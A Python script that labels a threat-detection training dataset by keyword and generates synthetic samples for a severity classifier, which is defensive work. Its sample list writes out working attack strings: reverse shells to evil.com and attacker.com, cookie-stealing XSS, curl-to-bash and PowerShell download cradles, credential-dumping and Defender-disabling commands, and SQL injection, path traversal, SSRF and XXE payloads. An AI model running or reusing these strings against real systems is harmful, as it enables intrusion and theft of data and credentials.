#!/usr/bin/env python3
"""
SentinelNet v4.0 — Data Labeling + Code Data Collection
Adds threat_type + action_hint to existing 160K samples
Generates code-based threat data (exploits, CVEs, shellcode patterns)
Author: @who_is_the_black_hat
"""

import json
import random
import logging
from pathlib import Path
from collections import Counter

logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s')
log = logging.getLogger(__name__)

DATA_DIR    = Path(__file__).resolve().parents[1] / 'models' / 'ml_engine' / 'training_data'
INPUT_FILE  = DATA_DIR / 'threat_master_balanced.jsonl'
OUTPUT_FILE = DATA_DIR / 'threat_v4_labeled.jsonl'

# ── Keyword rules for threat_type ─────────────────────────────────────────────

TYPE_RULES = [
    ('apt',        ['apt28','apt29','lazarus','cozy bear','fancy bear','carbanak','fin7','ta505',
                    'nation state','advanced persistent','threat actor','ttps','mitre att&ck',
                    'lateral movement','persistence','c2','command and control','cobalt strike',
                    'empire','bloodhound','impacket']),
    ('malware',    ['ransomware','malware','trojan','backdoor','rootkit','botnet','keylogger',
                    'infostealer','fileless','worm','virus','spyware','cryptominer',
                    'emotet','trickbot','ryuk','conti','lockbit','mimikatz','metasploit',
                    'meterpreter','shellcode','payload','dropper','loader']),
    ('web_vuln',   ['sql injection','sqli','xss','cross-site','csrf','ssrf','rce','lfi','rfi',
                    'xxe','ssti','idor','cors','open redirect','prototype pollution','clickjacking',
                    'command injection','path traversal','deserialization','jwt','oauth','graphql',
                    'buffer overflow','format string','heap spray','use after free']),
    ('breach',     ['data breach','credential','password leak','stealer log','infostealer',
                    'haveibeenpwned','dehashed','leakcheck','paste','dump','combo list',
                    'plaintext password','credential stuffing','account takeover','exfiltration']),
    ('phishing',   ['phishing','spearphishing','vishing','smishing','social engineering',
                    'pretexting','whaling','business email compromise','bec','fake login',
                    'credential harvest','typosquat','evilginx','gophish']),
    ('recon',      ['reconnaissance','osint','subdomain','enumeration','port scan','nmap',
                    'shodan','whois','dns','certificate transparency','wayback','dorking',
                    'footprint','attack surface','asset discovery','amass','subfinder']),
    ('misconfig',  ['misconfiguration','exposed bucket','s3 public','open port','default password',
                    'debug mode','directory listing','sensitive file','backup exposed',
                    'admin panel','unauthenticated','no authentication','docker exposed',
                    'kubernetes exposed','git exposed']),
    ('insider',    ['insider threat','disgruntled','employee','privilege abuse',
                    'unauthorized access','policy violation','rogue employee','data theft']),
    ('social_eng', ['social engineering','impersonation','fake profile','deepfake',
                    'catfish','romance scam','fraud','scam','manipulation','pretexting']),
]

ACTION_MAP = {
    'CRITICAL': {'apt':'escalate','malware':'block_ip','web_vuln':'patch_now',
                 'breach':'collect_evidence','phishing':'notify_team','misconfig':'patch_now',
                 'insider':'escalate','recon':'investigate','social_eng':'investigate','unknown':'escalate'},
    'HIGH':     {'apt':'escalate','malware':'block_ip','web_vuln':'patch_now',
                 'breach':'notify_team','phishing':'notify_team','misconfig':'patch_now',
                 'insider':'investigate','recon':'investigate','social_eng':'monitor','unknown':'investigate'},
    'MEDIUM':   {'apt':'investigate','malware':'investigate','web_vuln':'patch_now',
                 'breach':'monitor','phishing':'monitor','misconfig':'investigate',
                 'insider':'monitor','recon':'monitor','social_eng':'monitor','unknown':'monitor'},
    'LOW':      {'apt':'monitor','malware':'monitor','web_vuln':'monitor',
                 'breach':'no_action','phishing':'monitor','misconfig':'monitor',
                 'insider':'monitor','recon':'no_action','social_eng':'no_action','unknown':'no_action'},
}

def classify_type(text: str) -> str:
    t = text.lower()
    scores = {ttype: sum(1 for kw in kws if kw in t) for ttype, kws in TYPE_RULES}
    best = max(scores, key=scores.get)
    return best if scores[best] > 0 else 'unknown'

def classify_action(label: str, ttype: str) -> str:
    return ACTION_MAP.get(label, {}).get(ttype, 'monitor')

# ── Code-based threat samples ─────────────────────────────────────────────────

CODE_BASE = [
    # SQLi
    ("SELECT * FROM users WHERE id=1 OR 1=1-- sqli bypass authentication critical", "CRITICAL", "web_vuln", "patch_now"),
    ("UNION SELECT username,password FROM admin-- sql injection credential dump", "CRITICAL", "web_vuln", "patch_now"),
    ("'; DROP TABLE users;-- destructive sql injection database", "CRITICAL", "web_vuln", "patch_now"),
    ("1' AND SLEEP(5)-- blind sql injection time-based", "HIGH", "web_vuln", "patch_now"),
    ("1 AND 1=2 UNION SELECT NULL,table_name FROM information_schema.tables-- sqli enum", "HIGH", "web_vuln", "patch_now"),
    # XSS
    ("<script>document.location='http://evil.com/?c='+document.cookie</script> xss cookie theft", "CRITICAL", "web_vuln", "patch_now"),
    ("<img src=x onerror=eval(atob('cGF5bG9hZA=='))> xss dom injection", "HIGH", "web_vuln", "patch_now"),
    ("javascript:alert(document.domain) xss reflected", "MEDIUM", "web_vuln", "patch_now"),
    ("<svg onload=fetch('http://evil.com/?x='+btoa(document.cookie))> stored xss", "CRITICAL", "web_vuln", "patch_now"),
    # RCE / Command injection
    ("; cat /etc/passwd command injection linux rce", "CRITICAL", "web_vuln", "patch_now"),
    ("| nc -e /bin/bash attacker.com 4444 reverse shell netcat rce", "CRITICAL", "web_vuln", "patch_now"),
    ("$(curl http://evil.com/shell.sh|bash) command injection rce", "CRITICAL", "web_vuln", "patch_now"),
    ("`id` command injection backtick rce linux", "HIGH", "web_vuln", "patch_now"),
    # LFI / Path traversal
    ("../../../etc/passwd lfi path traversal local file inclusion", "HIGH", "web_vuln", "patch_now"),
    ("php://filter/convert.base64-encode/resource=config.php lfi php wrapper", "CRITICAL", "web_vuln", "patch_now"),
    ("....//....//....//etc/passwd double encoding path traversal bypass waf", "HIGH", "web_vuln", "patch_now"),
    # SSRF
    ("http://169.254.169.254/latest/meta-data/ ssrf aws imds metadata", "CRITICAL", "web_vuln", "patch_now"),
    ("http://localhost:6379/ ssrf redis internal service", "HIGH", "web_vuln", "patch_now"),
    ("http://0.0.0.0:8080/admin ssrf internal admin panel", "HIGH", "web_vuln", "patch_now"),
    # XXE
    ("<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo> xxe injection", "CRITICAL", "web_vuln", "patch_now"),
    # SSTI
    ("{{7*7}} ssti template injection jinja2 flask", "HIGH", "web_vuln", "patch_now"),
    ("${7*7} ssti freemarker template injection rce", "CRITICAL", "web_vuln", "patch_now"),
    # Python reverse shells / malware
    ("import socket,subprocess,os;s=socket.socket();s.connect(('evil.com',4444));os.dup2(s.fileno(),0);subprocess.call(['/bin/sh']) python reverse shell malware", "CRITICAL", "malware", "block_ip"),
    ("exec(compile(base64.b64decode('cGF5bG9hZA=='),'<string>','exec')) python obfuscated malware loader", "CRITICAL", "malware", "block_ip"),
    # PowerShell malware
    ("powershell -enc UGF5bG9hZA== -nop -w hidden -exec bypass amsi bypass malware loader", "CRITICAL", "malware", "block_ip"),
    ("IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1') powershell download cradle", "CRITICAL", "malware", "block_ip"),
    ("Set-MpPreference -DisableRealtimeMonitoring $true powershell disable defender", "CRITICAL", "malware", "block_ip"),
    # Windows malware / persistence
    ("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d payload.exe persistence registry", "HIGH", "malware", "block_ip"),
    ("schtasks /create /tn 'Update' /tr payload.exe /sc onlogon persistence scheduled task", "HIGH", "malware", "block_ip"),
    ("certutil -urlcache -split -f http://evil.com/payload.exe malware download lolbas", "CRITICAL", "malware", "block_ip"),
    # Mimikatz / credential dump
    ("mimikatz sekurlsa::logonpasswords credential dump windows lsass memory", "CRITICAL", "malware", "block_ip"),
    ("procdump -ma lsass.exe lsass.dmp credential dump lsass", "CRITICAL", "malware", "block_ip"),
    ("Invoke-Mimikatz -Command sekurlsa::logonpasswords powershell credential dump", "CRITICAL", "malware", "block_ip"),
    # Metasploit
    ("msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f exe metasploit payload", "CRITICAL", "malware", "block_ip"),
    ("use exploit/multi/handler set payload windows/meterpreter/reverse_tcp metasploit listener", "CRITICAL", "malware", "block_ip"),
    # Cobalt Strike / APT
    ("cobalt strike beacon c2 communication apt lateral movement post exploitation", "CRITICAL", "apt", "escalate"),
    ("empire powershell c2 framework apt post exploitation lateral movement", "CRITICAL", "apt", "escalate"),
    ("bloodhound active directory attack path privilege escalation apt domain admin", "HIGH", "apt", "escalate"),
    ("impacket psexec lateral movement smb windows apt pass the hash", "CRITICAL", "apt", "escalate"),
    ("rubeus kerberoasting ticket granting service tgs apt active directory", "HIGH", "apt", "escalate"),
    # Recon tools
    ("nmap -sV -sC -p- --script vuln target.com port scan vulnerability", "MEDIUM", "recon", "investigate"),
    ("subfinder -d target.com -o subdomains.txt subdomain enumeration", "LOW", "recon", "monitor"),
    ("shodan search hostname:target.com port:22 exposed ssh", "MEDIUM", "recon", "investigate"),
    ("amass enum -passive -d target.com dns enumeration passive recon", "LOW", "recon", "monitor"),
    ("theHarvester -d target.com -b all email harvesting osint", "MEDIUM", "recon", "investigate"),
    ("gobuster dir -u http://target.com -w wordlist.txt directory brute force", "MEDIUM", "recon", "investigate"),
    ("nuclei -u target.com -t cves/ vulnerability scan template", "HIGH", "recon", "investigate"),
    # Password attacks
    ("hashcat -m 0 hashes.txt rockyou.txt password cracking md5", "HIGH", "breach", "notify_team"),
    ("john --wordlist=rockyou.txt shadow.txt password cracking linux", "HIGH", "breach", "notify_team"),
    ("hydra -l admin -P passwords.txt ssh://target.com brute force ssh", "HIGH", "breach", "notify_team"),
    ("credential stuffing attack combo list leaked passwords account takeover", "CRITICAL", "breach", "collect_evidence"),
    ("spray password spraying active directory o365 brute force", "HIGH", "breach", "notify_team"),
    # Privilege escalation
    ("sudo -l privilege escalation linux sudo misconfiguration", "HIGH", "web_vuln", "patch_now"),
    ("find / -perm -4000 -type f 2>/dev/null suid bit privilege escalation linux", "HIGH", "web_vuln", "investigate"),
    ("linpeas.sh linux privilege escalation automated script", "HIGH", "recon", "investigate"),
    ("winpeas.exe windows privilege escalation automated enumeration", "HIGH", "recon", "investigate"),
    # Misconfig
    ("aws s3 ls s3://bucket-name --no-sign-request public bucket exposed data", "CRITICAL", "misconfig", "patch_now"),
    ("docker -H tcp://0.0.0.0:2375 ps exposed docker daemon unauthenticated rce", "CRITICAL", "misconfig", "patch_now"),
    ("kubectl get pods --all-namespaces kubernetes exposed api server unauthenticated", "CRITICAL", "misconfig", "patch_now"),
    ("git clone http://target.com/.git exposed git repository source code leak", "HIGH", "misconfig", "patch_now"),
    ("curl http://target.com/.env exposed environment file api keys secrets", "CRITICAL", "misconfig", "patch_now"),
    # Phishing
    ("evilginx2 phishing proxy credential harvest oauth token steal reverse proxy", "CRITICAL", "phishing", "notify_team"),
    ("gophish phishing campaign email template credential harvest spearphishing", "HIGH", "phishing", "notify_team"),
    ("typosquatting domain registration phishing lookalike domain brand impersonation", "MEDIUM", "phishing", "monitor"),
    # Low severity / benign
    ("security awareness training phishing simulation employee education program", "LOW", "social_eng", "no_action"),
    ("vulnerability disclosure responsible disclosure bug bounty program", "LOW", "unknown", "no_action"),
    ("patch management update software security baseline compliance hardening", "LOW", "misconfig", "monitor"),
    ("firewall rule review network segmentation security hardening best practice", "LOW", "misconfig", "monitor"),
    ("log monitoring siem alert correlation security operations center soc", "LOW", "unknown", "monitor"),
    ("penetration testing authorized scope rules of engagement ethical hacking", "LOW", "recon", "no_action"),
    ("cve-2021-44228 log4shell remote code execution java log4j critical vulnerability", "CRITICAL", "web_vuln", "patch_now"),
    ("cve-2017-0144 eternalblue smb exploit wannacry ransomware ms17-010", "CRITICAL", "malware", "block_ip"),
    ("cve-2021-26855 proxylogon exchange server rce microsoft", "CRITICAL", "web_vuln", "patch_now"),
    ("cve-2022-30190 follina msdt rce microsoft office zero day", "CRITICAL", "web_vuln", "patch_now"),
]

def generate_code_samples(n: int = 8000) -> list:
    samples = [{'text': t, 'label': l, 'threat_type': tt, 'action_hint': ah}
               for t, l, tt, ah in CODE_BASE]
    label_order = ['LOW', 'MEDIUM', 'HIGH', 'CRITICAL']
    while len(samples) < n:
        s1, s2 = random.choice(CODE_BASE), random.choice(CODE_BASE)
        label = s1[1] if label_order.index(s1[1]) >= label_order.index(s2[1]) else s2[1]
        ttype = s1[2] if s1[2] != 'unknown' else s2[2]
        samples.append({
            'text': f"{s1[0]} {s2[0]}"[:600],
            'label': label,
            'threat_type': ttype,
            'action_hint': classify_action(label, ttype),
        })
    return samples[:n]

# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    log.info(f"Loading {INPUT_FILE}")
    samples = []
    with open(INPUT_FILE) as f:
        for line in f:
            try:
                s = json.loads(line.strip())
                if s.get('text') and s.get('label') in ('LOW','MEDIUM','HIGH','CRITICAL'):
                    samples.append(s)
            except:
                pass
    log.info(f"Loaded {len(samples):,} samples")

    # Auto-label threat_type + action_hint
    for s in samples:
        if not s.get('threat_type'):
            s['threat_type'] = classify_type(s['text'])
        if not s.get('action_hint'):
            s['action_hint'] = classify_action(s['label'], s['threat_type'])

    # Add code samples
    code_data = generate_code_samples(8000)
    log.info(f"Adding {len(code_data)} code samples")
    samples.extend(code_data)

    random.shuffle(samples)

    with open(OUTPUT_FILE, 'w') as f:
        for s in samples:
            f.write(json.dumps(s) + '\n')

    label_dist  = Counter(s['label'] for s in samples)
    type_dist   = Counter(s['threat_type'] for s in samples)
    action_dist = Counter(s['action_hint'] for s in samples)
    has_type    = sum(1 for s in samples if s.get('threat_type') and s['threat_type'] != 'unknown')
    has_action  = sum(1 for s in samples if s.get('action_hint'))

    print(f"\n{'='*55}")
    print(f"Total samples  : {len(samples):,}")
    print(f"Label dist     : {dict(label_dist)}")
    print(f"Top types      : {dict(type_dist.most_common(6))}")
    print(f"Action dist    : {dict(action_dist.most_common(5))}")
    print(f"threat_type    : {has_type:,} ({has_type/len(samples)*100:.1f}%)")
    print(f"action_hint    : {has_action:,} ({has_action/len(samples)*100:.1f}%)")
    print(f"Output         : {OUTPUT_FILE}")
    print(f"{'='*55}")
    print(f"\nNext steps:")
    print(f"  1. Upload {OUTPUT_FILE.name} to Google Drive root")
    print(f"  2. Colab mein sentinel_colab.ipynb open karo (T4 GPU)")
    print(f"  3. Cell 2 mein DRIVE_PATH = 'threat_v4_labeled.jsonl' set karo")
    print(f"  4. Train karo (~30 min on T4)")
    print(f"  5. Download sentinel_threat_net.pt + sentinel_vocab.json")
    print(f"  6. cp ~/Downloads/sentinel_threat_net.pt /home/kali/osints/models/ml_engine/")
    print(f"  7. cp ~/Downloads/sentinel_vocab.json    /home/kali/osints/models/ml_engine/")

if __name__ == '__main__':
    main()
